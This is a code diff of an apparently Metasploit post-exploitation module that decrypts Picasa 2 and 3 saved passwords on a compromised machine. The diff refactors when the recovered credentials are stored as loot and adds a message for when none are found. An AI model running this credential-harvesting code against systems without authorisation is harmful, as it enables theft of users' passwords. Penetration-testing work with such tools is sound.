@@ -87,7 +87,9 @@ class Metasploit3 < Msf::Post
 						"User",
 						"Password"
 					])
-
+			
+			
+			foundcreds = 0
 			if username != nil and password != nil				
 				passbin = [password].pack("H*")
 				pass = decrypt_password(passbin)
@@ -96,16 +98,9 @@ class Metasploit3 < Msf::Post
 					print_status("Found Picasa 2 credentials.")
 					print_good("Username: #{username}\t Password: #{pass}")				
 					
+					foundcreds = 1
 					credentials << [username,pass]
-					path = store_loot(
-					"picasa.creds",
-					"text/csv",
-					session,
-					credentials.to_csv,
-					"decrypted_picasa_data.csv",
-					"Decrypted Picasa Passwords")
 
-					print_status("Decrypted passwords saved in: #{path}")	
 				end
 			end
 
@@ -124,19 +119,24 @@ class Metasploit3 < Msf::Post
 					print_status("Found Picasa 3 credentials.")
 					print_good("Username: #{username}\t Password: #{pass}")					
 
-
+					foundcreds = 1
 					credentials << [username,pass]
-					path = store_loot(
-					"picasa.creds",
-					"text/csv",
-					session,
-					credentials.to_csv,
-					"decrypted_picasa_data.csv",
-					"Decrypted Picasa Passwords")
-
-					print_status("Decrypted passwords saved in: #{path}")
 				end
 			end
+		
+		if foundcreds == 1
+			path = store_loot(
+			"picasa.creds",
+			"text/csv",
+			session,
+			credentials.to_csv,
+			"decrypted_picasa_data.csv",
+			"Decrypted Picasa Passwords")
+
+			print_status("Decrypted passwords saved in: #{path}")
+		else 
+			print_status("No Picasa credentials found.")
+		end
 
 		rescue ::Exception => e
 				print_error("An error has occurred: #{e.to_s}")
